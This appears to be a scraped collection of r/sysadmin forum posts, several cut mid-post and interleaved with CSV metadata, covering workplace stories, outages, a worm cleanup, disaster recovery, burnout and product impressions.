There are three servers, a ""main server"", an ""SQL server"", and a ""promail"" server... Promail is basically a warehousing/processing/shipping software from what i have learned so far.  The servers are all running windows 2003, and windows is a few months out-dated on all of them.  I would update them, but im not even sure how to go about doing that.  Plus i feel like doing so would most certainly mess other things in the system up.  In addition to the servers there is about 65 computers in this huge building running a mix of windows 7, and windows xp pro.  If i had to guess there is probably about 30 printers as well, all networked.  

Here is where it gets really interesting.. I have built about 10 computers for myself/friends/family, brought them back to life from major viruses, and tweaked with every possible setting i could get my hands on.. However, i have literally no experience with professional servers.

I know most of you are probably laughing at the thought of three servers being a big deal, but to me its a mountain.
Since i have started i have fixed a bunch of small problems people had, all windows related... But im clueless about the entire server aspect, i cant even figure out how to manage permissions...

EDIT:  Thanks guys, i have been reading all your comments all morning. I really appreciate the willingness to help a complete stranger.  These have all been the kind of answers i was looking for, really gives me a good guideline.  

All i ask from you guys is guidance, tell me a few books to read, point me to a few articles, tell me what i should do to build up some knowledge...
And by all means, ask me questions i should know the answers to.
Because honestly, i dont even know where to begin...

This is my first post and I feel something like a relative had died.

The story is this: I work for a small company and my coworker and I share the load in software development and managing of the rented servers. I joined the company almost a year ago and he is for over 3 years in the same position. I have to say, that he is no easygoing type of guy: always getting in fights with our boss, projectleaders and coworkers from other fields over topics like how work should be done and stuff like this. But I always ignored his attitude and I always focused on the work rather than the environment I'm working in. So, I earned the trust of my fellow coworker and went with him for lunch every day, until yesterday....

He came in the office quite upset and sweared quite a lot in front of his PC. Of course I noticed his bad mood and asked what the matter is and If I could help or if I was maybe the cause of any problem he obviously had. -Edit- He wouldn't tell. At noon he left the office and told the boss he was sick.

When I came in the office this morning, our most important webservers were down. I tried to log in, no success...Well that is odd I thought, so I checked whith our hoster if there was any security breach (couldn't ask my coworker directly because he is ""sick""). Turns out he changed all the passwords on our most valuable servers. I wrote him an e-mail to ask why, but he wouldn't respond, so I told my boss. My coworker finally answered my boss,  but not me, that there were some ""problems"" and that it wouldn't affect my work (except I could not make an assesment why our webservers were down).

Long story short. I can't fight the feeling that my coworker is trying to put me down or something like that. My boss is pissed of and I am too. 

So, do you ever had any storys like this and what would you do in my situation?

Thanks!

( 2-weeks notice as of 5:30 PM MST 2.22.2013) 

As much as I did not want to leave them without my skills, I have spent the last 8 months training my ""backup"" to be my new replacement. 

We rebuilt our DC over the last 4-6 months and I made sure they were a major part of this process while documenting EVERYTHING. I made sure to tell him before I put in my notice so that he was aware of the situation at hand. As expected, he was not surprised and wishes the best for me as well as asking that I try to help out where I can with what I know of the systems already in place. (Happily agreed!)

I have plenty of bad things to say about how things worked out in our office but it is not the time or place to discuss them beyond the ""Tons of stuff against the general best-practices"" setup. 

I am moving on to be a full time student and will be working as a basic ""helpdesk"" type tech on campus while I focus on getting my degree and helping our Cyber Defense team rock the world =)  


I feel like this was where I had to go if I want to advance in the world and be more than just a ""sysadmin"". The world is a a big place and I have yet to make a large enough mark on it to be useful. 

I just felt like telling ***someone***. I hope reddit is a good place for this.

On an unrelated note: I am teaching LINUX Admin at a local community college and I am happy to share my course with anyone interested in learning. If you PM me I will send you my email address and my *current* course work that you can complete and send back to me for a ""grade"" and feedback if your are interested in getting into Linux admin. 

 Before anyone worries about the ""new guy"". He is experienced in Linux and needed very little catch-up to understand our setup. I built this DC(Data Center) from scratch from 2 servers up to our current 45 servers (On a rock-solid VM setup) with hundreds if not thousands of clients. 

He understands exactly what he has gotten himself into and I have made it very clear that he is to contact me if there are questions about how something works if the documentation is lacking. (You always miss something right?)

All-in-all. I cant wait to be a full time student for the first time in 5-6 years and im going for a killer degree in hardware + software. Sysadmin is fun but I like to build ""things"" =) 

Good Luck to everyone else out there in Admin Land! Thanks for being an outlet for my last ""im an admin"" post!

What the hell am I talking about?  This is /r/sysadmin - we live quietly surrounded by the hum of chillers in the data center and hunt snacks among the cubicles.

For most the adventure of hunting down a new food truck during lunch is as long a term of exposure to sunlight we commonly get.

Still, I've found an opportunity I've been considering with Mrs. Sysadmin that would put me to work...outside.

I'm in the midst of trying to schedule an interview with the owner of a small GIS data collection company.  It's a 20-50 person operation working teams of two all over the US West of the Mississippi.  They are looking for a one-man-band IT guy and I've already spoken with one of the senior employees of the company.  I have his approval at this point buy my candidacy now goes to the old man himself.

In addition to managing a couple of VPS's for core services I'd be responsible for the GIS and PC gear the teams use in the field.  I'd be doing a lot of remote support but also a lot of travel and time in field (about 2/3 on the road or in the bush) doing testing and development of new gear and processes.  I would also be going in-field with teams to train and deploy new gear.

We're talking ATV's and horseback deep in the bush.  Helicopters and off-road vehicles.  Burbs and Urbs in the mix as well.

No cubicle.

I've been in IT for 20 years and this would be a huge change for me.  I'd be going from planning the deployment of hundreds of servers or switches to a couple dozen laptops.  I've been a GIS analyst and admin for many of those years.

The money's good, a little better actually.

I'm actually a geocache nerd as well and have dabbled in urban exploration.  I love to travel and explore in general.  I'm not a big fan of tourist sites, I'd rather explore the abandoned tunnels of a city than it's shopping malls.  I love the outdoors and spend much of my vacation hiking as far as I can into the back country.

This is crazy right?  Nobody gets out of cubeville.  I must be dreaming.

Would you do it?  Would you go outside?

5.13 local time (3.13 servers time) I was peacefully asleep when the pager woke me up. Just in case I didn't listen, it went off around 100 times, mainly apache processes dead. Great way to wake up! I connect, still half asleep, and notice that the root cause is a down db. Weird, we have a failover, what's going on? Before continuing my troubleshooting, I contacted the dba.


Surprise! Even at this time of the night, he was awake, and he had noticed the issue, so he decided to wake up someone else from my team (who wasn't on call) to let him know something was wrong. Poor guy, but whatever, he saved me a call because I needed a hand.


Since it was a db issue, we decided to call someone from my team (technical operations), who happens to have built all the db boxes, to provide a hand. Meanwhile the dba was asking via irc for a bridge to start troubleshooting (what? can't you use irc??). I ask dba if he had done any changes. Negative. So far he had detected that mysql wasn't running and that the san partition with the db wasn't mounted. He didn't know what the failover server was.


Coworker 2 connected, look at the box for 5 mins and found out the issue: a configuration file was missing so the db failed to restart. He recreated the file from a backup, started the db, cleared the locked processes, and by restarting all the apaches that didn't take kindly to not having a db, we got our live site up.


Now that everything is stable, time to find out what happened to that file.

1. There were no scheduled changes tonight
2. The logs showed that there were mysql restart commands manually launched
3. Mysql went down 3.10, the only person in the box at the time was DBA (3.09 to 3.11, he was very productive in those 2 mins)
4. The monitoring that he claimed had warned him of what was going on has been dead for months
5. DBA claimed he had done no changes
6. DBA has a history of doing changes without records, in production, without rollbacks, killing the livesite, and he doesn't know how to fix
7. DBA always chooses to lie instead of admitting he was doing things he shouldn't have


So he was confronted: He didn't do it. He was presented with the logs. He claims to have connected because he saw that something was up (he even saw it happening in the broken monitor 2 mins before actually happening!). He claims the db chose to get restarted on its own, even though it has no record of ever doing so. He has a change record for sunday, so we figured he tried to save some time by doing it today. On the change record he is warned: don't forget to recreate my.cnf if you happen to move it. He didn't remember. The db didn't take kindly to it.


So, finally, the conclusion. I hate, hate, HATE people like this, who lie to try to get out of trouble, who keeps on lying when confronted with evidence of their lies. Why don't they have the balls (or the ovaries) to say ""I fucked up, I'm sorry, but I'll never do the same mistake again""?? And why do they keep on doing the same mistakes over and over again? Learn something, damn it! And why do the managers always defend them?? After he had done something like this, we had revoked his access. Nope, unacceptable, restore privileges immediately. Look what happened because we did!

I was a new manager when hired, having held a number of engineer positions before.  I was promised that I would be mentored into the position.  Sadly, my ""mentoring"" from my boss turned out to be micro-management, mixed with rants about how my attitude is poor.

Some of this is fair.  I'm not good at delegating or following up with my people, and a manager's got to do that to stay alive.

But I had hoped for better stability and more approachability from my superior.  He seems to have a deep-seated dislike for anyone who appears to have an attitude problem.  I made the mistake of showing disappointment in front of him when I was only disappointed in myself.  And now, I pay for it again and again, despite my attempts to explain the situation.  I made yet another mistake when I let despair cross my face when I was the only person left in the department.  So lesson learned - never show emotion. ;)

(Thanks for reading up to this point - needed to get that off my chest.)

I'm through trying to square the circle and be a manager.  I don't enjoy it.  I've also had enough of the long hours, enough of the stress of keeping an international network online, and enough of fearing I'll be fired tomorrow for looking the wrong way in front of the wrong people.  I'm burnt the fuck out and ready for a career change.

What are some gems you found left by your predecessor?,149,46,83,http://www.reddit.com/r/sysadmin/comments/wwxbq/today_i_encountered_something_so_baffling_and/,"Three months ago I took over as the admin for a local government entity. I am in the middle of replacing a few core switches (Catalyst 4510 R+E) at two sites. One of these sites feeds a building about 100 yards next to it via fiber. However, their is no patch panel for the feed coming from that building, just two MM fiber patch cables coming down through the raceway. This was confusing to me as there is one patch panel with a 12 pair SM cable coming from our main site 3 miles away.

I went to the switch room in the other building and see a 3 pair MM patch panel mounted on the switch rack so I know there has to be one in this bulding somewhere. I get a guy from maintenance who has worked in the building for 10 years to help me trace down where the cable leads. We follow it through the false ceiling about 50 feet down a hall to a door that he has never opened since he has been there. We open the door and there is a walk in cooler with the door removed in the room that is being used to store old office furniture. Above it we can see the fiber running above the false ceiling next door. I get a ladder and climb up on the cooler and point my flashlight down to the false ceiling next door and this is what I find:
http://imgur.com/7G7zR

As you can see the patch panel is resting on the false ceiling above someones office. It looks like there is about 10 feet of service loop there so they could have at least brought it down off the ceiling and mounted it on the wall. I assume the ran out of cable when they did the original pull and just said screw it. The maintenance guy and I were floored. It did make for a hilarious end to a somewhat stressful week.

2. The stencils are either too generic or too specific.  I don't need a near-photorealistic looking Catalyst switch; that level of detail just distracts from the diagram.  At the other end of the spectrum: I can have any type of computer... as long as it's beige and either a desktop or a full-size tower.

I want a network diagramming tool that allows me to quickly make really nice looking diagrams.  That's it.  It doesn't need to scan my LAN to try and guess what I have installed and I don't need any other useless bells and whistles.

Wondering if you think this sounds like your classic burnout or what:
I've been in this industry for around 10 years now, worked my way up from tech support to sysadmin, and I just started this new job about 9 months ago, first assignment i was given was to convert their 2 major pieces of software into 1 new program that had been purchased before i came aboard.  we just rolled it out beginning of this month, i have been working long hours dealing with this rollout, actually getting this place into a decent workable structure and getting to know this undocumented network.  I had also purchased a new house 5 months prior to starting here and have been reno'ing it in my ""downtime"" when i am not dealing with my 4 year old daughter and 8 month old son.  Lately i have just lost all interest in doing ANYTHING, all i want to do is sleep and immerse myself in cheap shitty sci fi books.  my stomach tightens into knots as soon as i wake up in the morning because i'm dreading going into work.  Nothing seems enjoyable anymore.  Started seeing a therapist a few weeks ago because i am sick and tired of being sick and tired, and she says take some time off work (impossible it seems like with new house, new born and his sister)  I really don't know what to do, i'm breaking down into tears of frustration a few times a week and it is just not like me to be that way, i'm drinking WAY too much and just generally a complete and total wreck.  
Does this sound like burnout to you guys, depression or mid life crisis or what?
sorry for the wall of text i just wanted to hear what you guys thought about this situation.

The clock hits 5, the change document is all signed off, live traffic is moved to our DR site and I get to work. I expect this to take no longer than half an hour then I can head home.

On the Equallogic group interface I create a couple of new 1TB volumes, set the permissions and we're all good.

I go to our first ESXi host, scan for new HBAs/volumes and it picks them up. I mount and format them. So far so good.
I get to the second host, do a scan and it mounts them perfectly. Great.

Onto the third. I do a scan, but it seems to be taking a little longer than usual. Something isn't right. Uh oh.

Then, vSphere reports the host as not responding.

I furiously start clicking ""disable notifications for all services on this host"" in Nagios for 10 different things so I don't get hundreds of texts sent to my phone.

This will delete the Java plugin every time group policy runs.  If your users absolutely need Java, you can hit the checkbox on the ""common"" page of the file deletion policy to have it apply only once.  After that the users who need it can reinstall Java.

Note:  This will still allow IE to use Java on sites not in the ""Internet Zone"".  A workaround for business-critical sites that require Java is to add those sites to the ""Trusted Sites Zone"".  This also works in Chrome and Firefox with the ""IE Tab"" extension.

1341179523.0,96,self.sysadmin,vw83i,Going through DR scenario.  You know the one you plan for but never want to go through... My thoughts and things I have learned!,122,26,46,http://www.reddit.com/r/sysadmin/comments/vw83i/going_through_dr_scenario_you_know_the_one_you/,"Obviously by now, you have heard of the massive storm the kicked the shit out of the Mid-Atlantic.  I am in the DC Metro area on the VA side.  I am in a DR scenario.

Since Friday around 10PM and now (5PM EST) my office still has no power.  I have been there 4 different times since Friday checking on power and consulting with my 2 Jr. Admins.  In the end we planned for stuff, but we concluded we (more me) screwed up.  

To start, I moved our Exchange 2007 server to our DR facility 13 months ago and ran it out of there with another in a 3rd data center.  Secondly, I fucked up hardcore and didn't finish building a 3rd backup domain controller (2 DC's in the main office, like an idiot) to put it with the Exchange servers.  As you can imagine, OWA, ActiveSync and Outlook Anywhere is NOT working or anything that needs to authenticate over AD.

Admitting this is my fault has fortified the need for a retooling of our DR planning.  

The one thing that did work was that the data storage is safe.  I did check and the ZFS SAN's have reported that all replication has finished and that there are no issues.  Even better was that all of the KVM virtual machines are running in DR. The HA ESX4 cluster didn't fair so well, but so far 90% of the VM's are up and running in DR.  The other 10% are not highly critical, just some test and QA VM's.

I came up with a plan to move our PDC from our main office to our DR site right now assuming that the power is still out in the morning.  Everything on the production network is in the same subnet, so it should be a drag and drop operation.  In the mean time, I am building a third domain controller as a backup and shove that in a third data center.  

To give you all some background on how it kinda ended up this way has to do with the lack of motivation from the C-Levels.  I have been pressuring them to migrate to Office365 for Exchange and SharePoint and to invest some more money in reducing the need to have our production servers in our main office.  I have shown plenty of evidence that even if we don't use a DR scenario, it is still cheaper in the long run.  I even argued that even if they chose not too, then I should be able to hire a 3rd Admin person to help with the day to day stuff.  Fell on deaf ears.

To limit trips back to the office to see if the power is on or not, I took an older Android phone, rooted it, installed Tasker, SL4A, Python and SuperUser.  I set it up to email me when power has been restored.  And also if the power goes out again.  I only knew the when it happened when my VPN tunnel from my house to the office went down.  I'll do full detailed write up on that once things settle in the office.  

**[EDIT]** [Posted an article on using Android and Tasker to detect power outages and restoration.](http://www.sysadminnexus.com/2012/07/01/how-to-detect-power-outages-and-when-it-is-restored/)

Lastly, the responses I got from the CEO, CFO, Finance Director, HR and Marketing Director is that no one wants to make a decision if we can be open for business tomorrow (Monday) or even HOW to handle a no-business day.  HR does not have a hard copy of a master contact list to call employees to let them know that we will not be open tomorrow.  It took me to tell the Finance Director that I cannot restore power and we have to wait for Dominion Power to fix it. She thinks I am ""fixing"" it.  She has called me several times this weekend on the ""status"".  Dumbass.  The CEO has authorized to put up a message on our company website that due to the power outage, we cannot do phone and email support.  The Marketing Director, who manages the website, told me to do it.  I refused as I have much more important things to do.  If I do it, it will be a rage comic image.  The CFO's only contribution is, and I quote: ""At least our power bill will be less.""  Useless twat. 

So I am at my wits end with this company and their bullshit.  Yes, I fucked up on the domain controller.  That is fixable and should be working in a few hours.  Outside of that, the attitude and lack of DR on their part is really going to fuck the company this week.  I have warned everyone above me that IT DR is one thing, but having a company DR is another and they need to be responsible for it.  

So, I hope you can take away some of the issues with DR and to double-triple check your plans and execution.  I didn't.  Also, you need to make sure your company can can also do DR on the non-IT side. 

**[UPDATE]**

Tasker saved me a trip.  Got the email that the power had been restored.  20 minutes drive back to the office and met up with my Jr. Admins.  We were able to badge right into the office as opposed to the noclip-wallhacks I had to do to get in (I have the master key). 

The servers are up and the KVM VM's are swinging back over.  Email and AD related stuff seems to be good to go too.  

The only thing that crapped out was a non-essential switch, 2 UPS batteries and the IP phone system is down.  All in all, not too bad.  Clocking in 33 hours from Friday night to now.  

I just got off the phone with the CEO and he is relieved.  I ripped the bandaide off and blasted him over the fact that no one outside of IT made any effort to assess the situation as a true DR.  ""What? Were you going to wait until Monday morning to have HR communicate with the employees?  What if the power didn't come back on?""

He plans on having a high level staff meeting about this.  He did say that in terms of IT, we did good and that he *now* realizes that the company as a whole needs a true DR plan.  Idiot. 

Honestly, this is the last straw for me and the absolute piss poor management that is ruining this company.  I have a executive board meeting on Monday about this situation, the status on the SaaS roll out and our company's future.  If these Ive League baffoons say some dumb shit, then I will give them my resignation right then and there.  I have another job lined up anyways.

**[UPDATE 2]**
Lost one server in the mix.  Capacitor on an old DL360 popped and rendered the motherboard useless.  I do not have similar hardware so I am currently running one of the drives from a RAID1 on another server and imaging it with Acronis and then virtualize it.  

I just got out of a staff meeting with senior management and I asked the important question of where is the official Business Continuity Planning (BCP).  I got ""deer in the headlights"" look from everyone.  The CTO (yes, Technology) commented that the IT DR should be the BCP.  I retorted to that with: ""IT DR should be **part** of the company-wide BCP, not the other way around.""  Silence.   

The CEO finally put his foot down and we started a high level view of creating a BCP.  Lucky for those assholes, I had researched templates and examples of BCP and threw up a Visio diagram of a good one I found.  I did comment that **I** should not be the one bringing up the topic, doing the research and herding everyone in to do it.  After 2 hours of bickering, each key manager is now in charge of completing their BCP tasks.  We are to come back on Thursday with a near finalized BCP plan and execute it.  I also mentioned to the staff the the SaaS rollout would be delayed until next weekend due to the outage and we had planned on moving all the servers to our 2 data centers.  The Marketing Director, who is the most useless human being on the planet, had the nerve to ask why we couldn't move it during the week.  I did not bother answering the question.

They are discontinuing their ""Perpetual"" licensing. Instead of paying monthly or yearly licensing fees, you could just pay a lump sum and be done with it.  
Many business and people prefer this.  
Some prefer just paying smaller, reoccurring fees. But you at least had a choice.  
  
Not any more. Perpetual licenses now must be purchased by Dec 31st, 2012. If you're keeping track, that gives you just 5 business days to decide on and approve any purchases.  
  
If your company is like *my* company, the next 5 business days may have lots of people on **vacation**. The person that approves our big purchases is out until January, for example. I'll only be in the office ~3 days this week.  
  
That's right - Code42/CrashPlan sent out emails at the end of the year, at a time when customers may not have a chance to respond to the change.  
  
If you work with Code42/CrashPlan for any Enterprise software or support, I'd recommend calling them and complaining about this **LAST MINUTE** change.  
  
Even if you don't mind them getting rid of Perpetual licensing, them sending out this email in such a way that many customers couldn't possibly react is **dishonest**.

I started going 'oh shit, wtf is going on'... At first, I thought it could have been a problem with our VNX (All of our network shares are cifs shares on our VNX5300); I cut the call with Symantec short and called EMC support to get a ticket open just in case.

A quick look at the shares and then a fast google brought me to the ""[Sexy](http://angelcom.com/virus-changes-all-folders-to-exe-files-and-hides-folders-and-files/#.UcILDrHD-70)"" (link to page that talks about removing it) virus.

Basically, this virus/worm was marking all files and folders on all network shares that an infected user had access to as ""Hidden Windows OS files"" and then creating .exe's with the same name and icon as all of the hidden stuff, clicking one of these exe's would then infect another user.

So once we realized this, I connected via 'computer management' to the VNX and started looking at the Open Sessions list on the network shares.  We had a number of people that had Hundreds of open files.  I started killing those sessions and had my fellow IT folks race to those PC's and pull their network cables (7 of us in IT counting the director).  At the same time, we emailed everyone to stay out of their network shares until further notice (needed the share to stay connected so we could find infected PC's more easily).

We ended up finding about 10 infected PC's, including two in IT that were causing the problem.  At this point, we started running malware bytes and kaspersky VRT on the infected systems and then came up with a script that went in to all of our shares and deleted all of the created files: *.exe, x.mpeg, autorun.inf that were created at the top level of all shares.  Luckily for us, this virus only targeted files and folders at the top level. of the share.

We were cleaning PC's until about 7p lastnight, clean, reboot, clean again, until we rebooted and got a scan w/ no results; then we would reconnect to the network and watch the user's open share sessions to verify that it was good.

At that point, we'd cleaned all of the PC's we could get to (some were behind locked doors, but were already disconnected).  We left notes for people to not connect their computers, reset the user's password (just in case) and left for the night.

This morning, we're cleaning up those last 2 infected systems that were locked up and I'm watching the open sessions on the shares for anything out of the ordinary (ie someone that connects and within 5mins has more than 50 open sessions.

Anyways, lessons learned here:  I'm VERY glad that I have a GPO that disables autorun (this virus loves autorun...), fast responses help a lot, I need to look at our ForeFront Online Exchange Filtering to figure out why the virus ridden email got through (pretty certain it started from an infected email attachment), and Forefront AV sucks - time to look for something better - Vipre, Sophos, Kaspersky, etc...


**Edit:**  So as of noon, we were left with 4 PC's that were more troublesome than the others to get the virus removed, one of them kept coming back, the other three randomly sprouted into one of the many 'fake antivirus' style viruses, while they werent even on the network (go figure).  We were able to get all but two of those fully cleaned, the last two will be reimaged either today or tomorrow.

We have also confirmed, mostly through yalls feedback that [this email](http://imgur.com/3xXuQCA) was the cuprit. As soon as I can get a copy of the actual email, so I can find message ID's, I'm going to contact MS FOPE support to have it checked out, and help me identify what I need to do to prevent emails spoofed as our domain from getting through their filters.


**Edit 2**  Found a copy of the file attachment, can't yet get a real copy of the initial email, but via exchange, I was able to find the message ID and I'll be contacting FOPE support probably tomorrow morning to get assistance in making sure that I have our filtering set up optimally, and find out why this one got thorugh.

After someone's advice on here, I uploaded the virus file to www.virustotal.com to have it checked and see some info - here's the results link: https://www.virustotal.com/en/file/7a17a9f3ded55924d1a19fada468db17bc1c11d3105cf68e2c519586eb51759f/analysis/1371758900/ in case you're curious.


**Edit 3** I'd like to beat my head against the desk for a few minutes...

I had inherited this comms rack which was being used for comms gear AND servers. Recent additions were all crammed in and it was a bit of joke. So over the weekend one of my helpdesk guys and I aimed to complete the following:  

 - Move all patching and networking (Dual WAN, Voice provider, Lync SBA, Riverbed and switching), into new Netshelter rack  
 - Add camera and environmental monitoring
 - New 32amp feed and new UPS
 - 2 new ESX servers and shared storage (New domain controller, migration of File, Print and WDS)

1341688882.0,91,self.sysadmin,w6t2s,More discussion on the upcoming ban on images,150,59,113,http://www.reddit.com/r/sysadmin/comments/w6t2s/more_discussion_on_the_upcoming_ban_on_images/,"The mods have discussed this topic a lot. 

The general consensus by the moderators (the only people who see all of the image submissions) is that about 1:10 straight image posts are valuable in that they contribute either constructive ideas or discussion. The rest only tend to produce upvotes, which (all other things being equal) is fine, except that with 10 images at the top of /r/sysadmin, they're taking up valuable space for actual, thought-provoking content. That's not what any of the moderators of the want, because it doesn't provide any value to you, the readers (or to us, for that matter). 

What we have done up until now has been to manually remove them. Since we don't have 24-hour moderators sitting by waiting to judge whether an image post is valuable or not, we miss a few. It's not a big deal, but as the number of subscribers has gone up, we have been missing more and more. Some of the posts we miss are fine, but most aren't, and all of the moderators feel bad removing something with 60 upvotes regardless of whether it adds anything to the subreddit. 

To try to skirt the issue of removing crap  posts that have high vote counts, we are trying other things,  one of which is [using AutoModerator to filter image posts](http://www.reddit.com/r/sysadmin/comments/vzqwg/rsysadmin_moderation_changes/). What this means is that if you submit a raw link to an image, it's going to be automatically removed. It might have been a crap image, or it might have been a really interesting image. Our automoderator script won't know. 

Because we want to encourage good images while discouraging bad images, the way to submit a good, thought-provoking image is in a self post, with short write-up of background information. 

Want an example? OK. The best example I can think of is the submission, [Ordered a software update CD from the manufacturer for a client. $600 and three weeks later, this came in the mail](http://www.reddit.com/r/sysadmin/comments/w61ak/ordered_a_software_update_cd_from_the/). As a comment to this, the submitter [Psykiv](http://www.reddit.com/user/psykiv) wrote: 
&gt;I can't give this to the client. Seriously, my partner and I are pissed they would even think about sending us something like this. This is the software update for a $14,000 pc-based measurement machine.
The client is going to think I sold them a ghetto bootleg copy.
&gt;
I already called the manufacturer and raised hell. Mind you, in the past I've gotten pressed CDs with manuals, in a nice DVD case. Not a scratched up case, a dvd+r written with sharpie, and a cd key scotch taped to it.

&gt;Has something similar happened to anyone else?

There is good discussion going on in that thread, and the picture was of value. It wasn't a ""drive by spamming"", where someone thought ""haha, this is funny"", submitted, then left. Psykiv apparently wanted to have a discussion. This is exactly what the mods here want to encourage.  

If you want to submit a picture that creates discussion, link to it in a self-post.

I recently became a Jr sys admin. After that, I frequently had to answer a Sr admin. To be blunt, this guy is a complete Dick. Coworkers that walk by listening to him literally yell at me because I told him something he didn't want to hear ask me ""how do you put up with that? I'd literally punch his face in"" to which I respond ""I'm just very patient.""

Well, my patience has run very thin and I just handed my two weeks in. Now the sr admin is flipping out because he obviously has more work to do now that I'm leaving. He even said that I better answer my phone if he had any questions for me after I leave. To which I just smiled and nodded saying ""ok"".

To be honest I didn't learn much from the guy. In fact I doubt he knew much himself. he had no interest in any automation, never made any scripts for anything, and spends half the day on the phone with tech support on how to fix our network. 

Now that I'm done ranting, this is my plea: please treat your jrs with the respect you wish to be treated with yourself. I guess this can go for any place and any position, but I feel this area of expertise should have emphasis on this.

Specifically, she wants to be able to print an invoice in colour from an accounting program. I looked up the case history for this client and this issue has gone on since 2008, with every case being marked as solved with no actual solution. Apparently every time she sees a new employee from my company she tries to bring it up as an issue as if she thinks we don't track past cases. I asked my boss if I should bother looking into it, and he said since they always pay their bills I can go for it if I want.

After attempting to fix the issue, I called a support company on the other end of the country that does work for their other office and they wrote the issue off years ago as unfixable. I decided to call the company that developed the application, and escalated the issue to the developer that worked on the printing code. He told me that the ability to print in colour does not exist for that version and never will, and a guy from my company calls once or twice a year to hear that. He even told me that the person requesting the invoices refused a solution to use tray 2 of her printer with a pre-printed logo to fix it, saying she wanted a solution and not a workaround. When I called the client to tell her this, she demanded that I fix it anyway and so did her boss. I told her I closed the case and would not spend any more time. I sent her a bill for $2500 of my time, and the support company I dealt with billed her another $1000. In the past 4 years this woman has wasted almost $20000 on an issue that can never be fixed.

Any other lost causes for you guys?

In 11th generation and newer servers SATA drives are not covered for the full term of the system warranty. Instead, they are covered for only one year from the time of purchase unless a special hard drive warranty is selected at the time of purchase. This is because SATA hard drives are not intended for a server environment and will wear out too frequently. This is not considered to be true of SAS hard drives and they are covered for the full term of your hardware contract. Just so you have it for your records, this system was shipped on 08-24-10.

1360687037.0,87,self.sysadmin,18du5s,For those who are curious... Installed BES 10 and Activated our first few BB10's yesterday... ,110,23,106,http://www.reddit.com/r/sysadmin/comments/18du5s/for_those_who_are_curious_installed_bes_10_and/,"The boss is a big BB fan, so being in Canada, we've already got some Z10s to test with, so we're running a demo license of the new BES 10... 

For those who are curious...

First of all, the install is virtually exactly the same as BES 5.x, to the letter. No real surprises there. After install, the web interface is pretty much exactly the same as 5.x (just a different color scheme). Adding/removing users is virtually exactly the same as in previous BES', albeit the mail delivery architecture has changed substantially.

The BES server no longer talks directly to Exchange via. MAPI. The BES server is essentially just an MDM server which uses activesync, plus some additional BlackBerry functionality added on top (substantially the same basic architecture as most of the other MDM solutions out there). There isn't a traditional 'Enterprise Activation' on the phone, so simply add a 'work account'. This is more or less the enterprise activation (needing a password from BES) though. From here, it provisions everything and sets up ActiveSync on the phone for the user (and prompts for their AD password).

Beyond that, you can still set up IT policies, although options/policies are **vastly** more limited in BES 10. Whereas in 5.x and old BBs, there was literally hundreds of policies, in the new BES 10 there's maybe about 50 policies. You can control all of the basics, and the basics of the BB10 platform (eg. BB Balance), but it's nowhere near what the old BES was policy-wise. What has improved, though, is they've re-jiggered/added Wifi and VPN profiles, so it's a tad easier to push out Wifi and VPN settings. 

Adding/pushing apps seems to be a lot easier, as you can more or less feed a URL right from the BB store, but we'll see how that goes later on...

Overall, the setup and activation was smooth and pretty easy to figure out...

I also installed the 'Management Studio', which is essentially just a jazzed-up version of the BES management site (with fewer options, but easier of helpdesk types to figure their way around). No real magic here, it's literally just a fancier website (although you're supposed to be able to tie your old bes and iOS/Android MDM servers into it)...

As far as the BB10 itself goes... It's alright, albeit to be honest unless you have strong fondness of BB (I don't, personally), there isn't really much reason to go with it, versus a iOS/Android device with MDM or ActiveSync. Most of the bits of the phone are pretty smooth, the browser is (dare I say) excellent (this is coming from a iOS/Safari fan). If the app selection improves, it could very well be a reasonably competitive platform... But that's a big if... It's still a modern, capable platform though, and seems very well polished. 

I'm happy to answer any questions sysadmin has... seeing as it looks like I'm going to be stuck on BB10 (again, BB loving boss...).

EDIT: Found my first official 'WTF' moment. They include Dropbox and Box apps - fine. You can uninstall them from the 'personal' space - great. You **cannot** uninstall them from the *'work'* space, nor can they be disabled or disallowed in BES. Some googling reveals nothing. W...T...F.... That alone is reason to drop the platform for us. We'll see...

EDIT 2: Glad I could do a little mini AMA. I have sent RIM an email about the dropbox thing, so I'll post an update here likely tomorrow or whenever I get an answer. Word on the forums is that this is a huge problem for people, and a potential show-stopper. I just spent the better part of an hour trying to access hidden menus (virtually none), and there's no uninstall to be found (in the work space, that is).",,False,self,t5_2qnp7,1360721150.0,,,True,t3_18du5s,http://www.reddit.com/r/sysadmin/comments/18du5s/for_those_who_are_curious_installed_bes_10_and/,

I'm an IT Consultant with many clients in the area that I live in. I was asked on Wednesday (17th) to look into what could possibly be a virus on one of my client's PCs. I gave the PC a onceover, and saw nothing wrong, but still ran a virus check using our product that we sell (Vipre Business). The scan came back clean, just a registry entry for an uninstaller. I let the client know and they were happily working once more.

Fast forward to Saturday (20th), where I was emailed by my boss and asked for a report of what I had done. I responded that I used our product to scan the machine, with a clean report and no complaints from the user. I received nothing back but a meeting request from my boss for 8am Monday morning with my account manager. 

This morning (22nd), I arrived slightly behind time (I let both my boss and account manager know, as I was stuck behind a train and couldn't physically get to the office) and apologized for my lateness. I was taken to the conference room with my boss and my account manager (who I might add is no higher than me on the food chain, we are co-workers, he is not a superior), and informed that I was negligent, that I was suspended for 3 days without pay, and, I quote, ""You better hope that in three days I've calmed down enough to have a conversation with you"".

I'm pretty much at a loss of what to do. I've had issues with this boss treating me like shit before, snide comments to co-workers, telling me to ""shut my fucking mouth before it gets ahead of my brain"", and generally having him treat me like a bad dog. I assume that because of my age (22), he believes that this is an acceptable way to treat me, although he treats the entire staff like this.

I apologize for the wall of text, but I'm at a loss of what to do, and I don't find myself there very often. I'm attempting to get information to contact HR (we have a contracted HR department, she isn't in the building), but I don't even know what I'm going to do once I get it. 

Has anyone experienced this before, and can help me out with some advice?

Gonna get an edit in here. 

I've spoken with the other owner, who told me that he agreed that this was an appropriate disciplinary action to alert me to the seriousness of this issue. He told me that the customer had a second opinion at a later date, and that a virus was found. I have no records of virus activity, nor do I have any concrete proof that there actually was an issue. I believe this is a case of a customer trying to get out of paying a contract, but that's a different story entirely.

I spoke with HR, who expressed concern at the amount of time between when I did the work and when the angry customer called in. She considered 3 days more than enough time for another, totally separate virus to infect the machine, and expressed concern at not having any knowledge of the issue herself, as she's the HR department for the company. I believe I will use this to my advantage.

I am in talks with several recruiters and a few users from here who have requested resume information to forward to employers. I have, in the time of 3 hours, decided that I didn't care where it was, I needed to get into another job.

I thank everyone here for their advice, especially those critical of my story and my actions. This has allowed me to learn from both sides of the fence, and I will use this knowledge to better myself in the future.

1. Expectation of greater workload and longer hours
 
2. Loss of individual autonomy, over scheduling, predictable income, loss of trust and respect of your professional role
 
